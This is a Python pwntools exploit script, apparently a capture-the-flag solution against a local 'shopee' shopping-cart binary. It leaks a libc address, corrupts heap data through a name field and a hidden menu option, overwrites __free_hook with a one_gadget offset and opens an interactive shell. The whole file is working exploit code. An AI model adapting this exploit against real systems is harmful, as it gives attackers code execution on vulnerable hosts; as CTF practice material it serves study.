#!/usr/bin/env python3

from pwn import *

exe = ELF("./shopee_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8003)

    return p

def add_item(p, idx):
    p.sendlineafter(b"option: ", b"1")
    p.sendlineafter(b"item: ", str(idx).encode())

def view_cart(p):
    p.sendlineafter(b"option: ", b"2")

def buy_cart(p):
    p.sendlineafter(b"option: ", b"3")

def set_name(p, payload):
    p.sendlineafter(b"option: ", b"4")
    p.sendlineafter(b"Name: ", payload)

def replace_item(p, cart_idx, item_idx):
    p.sendlineafter(b"option: ", b"1337")
    p.sendlineafter(b"replace: ", str(cart_idx).encode())
    p.sendlineafter(b"with: ", str(item_idx).encode())

def main():
    p = conn()

    # good luck pwning :)
    add_item(p, 5)
    view_cart(p)
    p.recvuntil(b"0: ")
    libc_leak = u64(p.recvuntil(b"($0)", drop=True).strip().ljust(8, b"\x00")) - 0x3ec760
    libc.address = libc_leak

    buy_cart(p)

    payload = flat(
        0x0, 0x0, 0x0,
        libc_leak + 0x3ed8e8, # __free_hook
    )
    set_name(p, payload) # items[4]

    replace_item(p, 0, 4)
    add_item(p, 1)

    payload = flat(
        0x0, 0x0, 0x0,
        libc_leak + 0x4f302
    )
    set_name(p, payload)
    add_item(p, 4)

    buy_cart(p)

    p.interactive()


if __name__ == "__main__":
    main()
